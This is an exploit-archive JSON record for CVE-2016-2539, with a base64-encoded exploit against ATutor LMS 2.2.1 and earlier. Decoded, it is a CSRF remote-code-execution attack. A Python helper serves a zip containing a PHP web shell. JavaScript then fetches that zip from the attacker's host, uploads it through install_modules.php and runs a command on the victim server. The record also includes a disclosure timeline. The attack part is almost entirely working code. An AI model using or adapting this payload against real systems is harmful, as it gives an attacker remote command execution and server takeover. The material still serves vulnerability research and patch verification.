{
    "source": "exploit-database", 
    "exploit": "LyogZXhwLmpzDQoNCkFUdXRvciBMTVMgPD0gMi4yLjEgaW5zdGFsbF9tb2R1bGVzLnBocCBDU1JGIFJlbW90ZSBDb2RlIEV4ZWN1dGlvbg0KYnkgbXJfbWUNCg0KTm90ZXM6DQpgYGBgYGANCi0gRGlzY292ZXJlZCBmb3IgQGlwbl9teCBzdHVkZW50cyBhZHZhbmNlZCBwaHAgdnVsbi9kZXYgY2xhc3MNCi0gVGVzdGVkIG9uIHRoZSBsYXRlc3QgRmlyZUZveCA0NC4wLjIgcmVsZWFzZSBidWlsZA0KLSBUaGlzIHBvYyBzaW1wbHkgdXBsb2FkcyBhIHppcCBmaWxlIGFzIHB3bi9zaS5waHAgd2l0aCBhICI8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iIGluIGl0DQotIFlvdSB3aWxsIG5lZWQgdG8gc2V0IHRoZSBBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW4gaGVhZGVyIHRvIGFsbG93IHRoZSB0YXJnZXQgdG8gcHVsbCB6aXBzDQotIFVzZSB0aGlzIHdpdGggeW91ciBmYXZvcml0ZSBYU1MgYXR0YWNrDQotIFN0dWRlbnQgcHJvb2YsIGFrYSBidWxsZXQgcHJvb2YNCg0KVGltZWxpbmU6DQpgYGBgYGBgYGANCjIzLzAyLzIwMTYgLSBub3RpZmllZCB2ZW5kb3IgdmlhIGluZm9bYXRdYXR1dG9yW2RvdF1jYQ0KMjQvMDIvMjAxNiAtIHJlcXVlc3RlZCBDVkUgYW5kIGFzc2lnbmVkIENWRS0yMDE2LTI1MzkNCjI0LzAyLzIwMTYgLSB2ZW5kb3IgcmVwbGllZCBzdGF0aW5nIHRoZXkgYXJlIGludmVzdGlnYXRpbmcgdGhlIGlzc3VlDQowNS8wMy8yMDE2IC0gdmVuZG9yIHBhdGNoZXMgdGhlIGlzc3VlIChodHRwczovL2dpdGh1Yi5jb20vYXR1dG9yL0FUdXRvci9jb21taXQvYmZjNmM4MGM2YzIxN2M1NTE1MTcyZjNjYzk0OWUxM2RmYTFhOTJhYykNCjA2LzAzLzIwMTYgLSBjb29yZGluYXRlZCBwdWJsaWMgcmVsZWFzZQ0KDQpFeGFtcGxlOiANCmBgYGBgYGBgDQptcl9tZUBqdXBpdGVyOn4kIGNhdCBwb2MucHkgDQojIS91c3IvYmluL3B5dGhvbg0KDQppbXBvcnQgc3lzDQppbXBvcnQgemlwZmlsZQ0KaW1wb3J0IEJhc2VIVFRQU2VydmVyDQpmcm9tIGNTdHJpbmdJTyBpbXBvcnQgU3RyaW5nSU8NCmZyb20gU2ltcGxlSFRUUFNlcnZlciBpbXBvcnQgU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyDQoNCmlmIGxlbihzeXMuYXJndikgPCAzOg0KICAgIHByaW50ICJVc2FnZTogJXMgPGxwb3J0PiA8dGFyZ2V0PiIgJSBzeXMuYXJndlswXQ0KICAgIHByaW50ICJlZzogJXMgODAwMCAxNzIuMTYuNjkuMTI4IiAlIHN5cy5hcmd2WzBdDQogICAgc3lzLmV4aXQoMSkNCg0KZGVmIF9idWlsZF96aXAoKToNCiAgICAiIiINCiAgICBidWlsZHMgdGhlIHppcCBmaWxlDQogICAgIiIiDQogICAgZiA9IFN0cmluZ0lPKCkNCiAgICB6ID0gemlwZmlsZS5aaXBGaWxlKGYsICd3JywgemlwZmlsZS5aSVBfREVGTEFURUQpDQogICAgei53cml0ZXN0cigncHduL3NpLnBocCcsICI8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iKQ0KICAgIHouY2xvc2UoKQ0KICAgIGhhbmRsZSA9IG9wZW4oJ3B3bi56aXAnLCd3YicpDQogICAgaGFuZGxlLndyaXRlKGYuZ2V0dmFsdWUoKSkNCiAgICBoYW5kbGUuY2xvc2UNCg0KY2xhc3MgQ09SU1JlcXVlc3RIYW5kbGVyIChTaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOg0KICAgIGRlZiBlbmRfaGVhZGVycyAoc2VsZik6DQogICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoJ0FjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpbicsICdodHRwOi8vJXMnICUgc3lzLmFyZ3ZbMl0pDQogICAgICAgIFNpbXBsZUhUVFBSZXF1ZXN0SGFuZGxlci5lbmRfaGVhZGVycyhzZWxmKQ0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIF9idWlsZF96aXAoKQ0KICAgIEJhc2VIVFRQU2VydmVyLnRlc3QoQ09SU1JlcXVlc3RIYW5kbGVyLCBCYXNlSFRUUFNlcnZlci5IVFRQU2VydmVyKQ0KDQptcl9tZUBqdXBpdGVyOn4kIC4vcG9jLnB5IDgwMDAgMTcyLjE2LjY5LjEyOA0KU2VydmluZyBIVFRQIG9uIDAuMC4wLjAgcG9ydCA4MDAwIC4uLg0KMTcyLjE2LjY5LjEgLSAtIFsyMy9GZWIvMjAxNiAxNDowNDowN10gIkdFVCAvZXhwLmpzIEhUVFAvMS4xIiAyMDAgLQ0KMTcyLjE2LjY5LjEgLSAtIFsyMy9GZWIvMjAxNiAxNDowNDowN10gIkdFVCAvcHduLnppcCBIVFRQLzEuMSIgMjAwIC0NCg0KfiBkZSBNZXhpY28gY29uIGFtb3IsDQoNCiovDQoNCnZhciBnZXRfaG9zdG5hbWUgPSBmdW5jdGlvbihocmVmKSB7DQogICAgdmFyIGwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJhIik7DQogICAgbC5ocmVmID0gaHJlZjsNCiAgICByZXR1cm4gbC5ob3N0bmFtZSArICI6IiArIGwucG9ydDsNCn07DQoNCmZ1bmN0aW9uIHRyb2xvbG9sb2wodXJsLCBmaWxlX2RhdGEsIGZpbGVuYW1lKSB7DQogICB2YXIgZmlsZV9zaXplID0gZmlsZV9kYXRhLmxlbmd0aCwNCiAgIGJvdW5kYXJ5ID0gIjgyODExNjU5MzE2NTIwNzkzNzY5MTcyMTI3OCIsDQogICB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsNCg0KICAgLy8gbGF0ZXN0IGZmIGRvZXNudCBoYXZlIHNlbmRBc0JpbmFyeSgpLCBzbyB3ZSByZWRlZmluZSBpdA0KICAgaWYoIXhoci5zZW5kQXNCaW5hcnkpew0KICAgICAgeGhyLnNlbmRBc0JpbmFyeSA9IGZ1bmN0aW9uKGRhdGFzdHIpIHsNCiAgICAgICAgICBmdW5jdGlvbiBieXRlVmFsdWUoeCkgew0KICAgICAgICAgICAgICByZXR1cm4geC5jaGFyQ29kZUF0KDApICYgMHhmZjsNCiAgICAgICAgICB9DQogICAgICAgICAgdmFyIG9yZHMgPSBBcnJheS5wcm90b3R5cGUubWFwLmNhbGwoZGF0YXN0ciwgYnl0ZVZhbHVlKTsNCiAgICAgICAgICB2YXIgdWk4YSA9IG5ldyBVaW50OEFycmF5KG9yZHMpOw0KICAgICAgICAgIHRoaXMuc2VuZCh1aThhLmJ1ZmZlcik7DQogICAgICB9DQogICB9DQogICANCiAgIC8vIHRoZSBjYWxsYmFjayBhZnRlciB0aGlzIHN0YWdlIGlzIGRvbmUuLi4NCiAgIHhoci5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHsNCiAgICAgICBpZiAoeGhyLnJlYWR5U3RhdGUgPT0gWE1MSHR0cFJlcXVlc3QuRE9ORSkgew0KICAgICAgICAgICB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsNCiAgICAgICAgICAgLy8gY2hhbmdlIHRoaXMgaWYgeW91IGNoYW5nZSB0aGUgemlwDQogICAgICAgICAgIHhoci5vcGVuKCJHRVQiLCAiL0FUdXRvci9tb2RzL3B3bi9zaS5waHA/Y21kPWlkIiwgdHJ1ZSk7DQogICAgICAgICAgIHhoci5zZW5kKCk7DQogICAgICAgfQ0KICAgfQ0KDQogICB4aHIub3BlbigiUE9TVCIsIHVybCwgdHJ1ZSk7DQogICAvLyBzaW11bGF0ZSBhIGZpbGUgTUlNRSBQT1NUIHJlcXVlc3QuDQogICB4aHIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwgIm11bHRpcGFydC9mb3JtLWRhdGEsIGJvdW5kYXJ5PSIrYm91bmRhcnkpOw0KICAgeGhyLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtTGVuZ3RoIiwgZmlsZV9zaXplKTsNCiAgIHZhciBib2R5ID0gIi0tIiArIGJvdW5kYXJ5ICsgIlxyXG4iOw0KICAgYm9keSArPSAnQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJtb2R1bGVmaWxlIjsgZmlsZW5hbWU9IicgKyBmaWxlbmFtZSArICciXHJcbic7DQogICBib2R5ICs9ICJDb250ZW50LVR5cGU6IGFyY2hpdmUvemlwXHJcblxyXG4iOw0KICAgYm9keSArPSBmaWxlX2RhdGEgKyAiXHJcbiI7DQogICBib2R5ICs9ICItLSIgKyBib3VuZGFyeSArICJcclxuIjsNCiAgIGJvZHkgKz0gJ0NvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iaW5zdGFsbF91cGxvYWQiXHJcblxyXG4nOw0KICAgYm9keSArPSAianVua1xyXG4iOw0KICAgYm9keSArPSAiLS0iICsgYm91bmRhcnk7DQogICB4aHIuc2VuZEFzQmluYXJ5KGJvZHkpOw0KICAgcmV0dXJuIHRydWU7DQp9DQoNCmZ1bmN0aW9uIHB3bigpew0KICAgIHZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsNCiAgICAvLyBldCBwaG9uZSBob21lDQogICAgdmFyIGhvbWUgPSBnZXRfaG9zdG5hbWUoZG9jdW1lbnQuc2NyaXB0c1swXS5zcmMpOw0KICAgIC8vIGdldCBvdXIgb3duIHppcCBmaWxlDQogICAgeGhyLm9wZW4oJ0dFVCcsICdodHRwOi8vJyArIGhvbWUgKyAnL3B3bi56aXAnLCB0cnVlKTsNCiAgICB4aHIucmVzcG9uc2VUeXBlID0gJ2Jsb2InOw0KICAgIHhoci5vbmxvYWQgPSBmdW5jdGlvbihlKSB7DQogICAgICAgIGlmICh0aGlzLnN0YXR1cyA9PSAyMDApIHsNCiAgICAgICAgICAgIC8vIHVzZSB0aGUgRmlsZVJlYWRlciBjbGFzcyB0byBnZXQgdGhlIHJhdyBiaW5hcnkNCiAgICAgICAgICAgIHZhciByZWFkZXIgPSBuZXcgd2luZG93LkZpbGVSZWFkZXIoKTsNCiAgICAgICAgICAgIHJlYWRlci5yZWFkQXNCaW5hcnlTdHJpbmcobmV3IEJsb2IoW3RoaXMucmVzcG9uc2VdLCB7dHlwZTogJ2FwcGxpY2F0aW9uL3ppcCd9KSk7IA0KICAgICAgICAgICAgcmVhZGVyLm9ubG9hZGVuZCA9IGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgIHRyb2xvbG9sb2woIi9BVHV0b3IvbW9kcy9fY29yZS9tb2R1bGVzL2luc3RhbGxfbW9kdWxlcy5waHAiLCByZWFkZXIucmVzdWx0LCAicHduLnppcCIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfTsNCiAgICB4aHIuc2VuZCgpOw0KfQ0KDQpwd24oKTs=", 
    "filename": "platforms/php/webapps/39524.js", 
    "id": "39524", 
    "cves": [
        "CVE-2016-2539"
    ]
}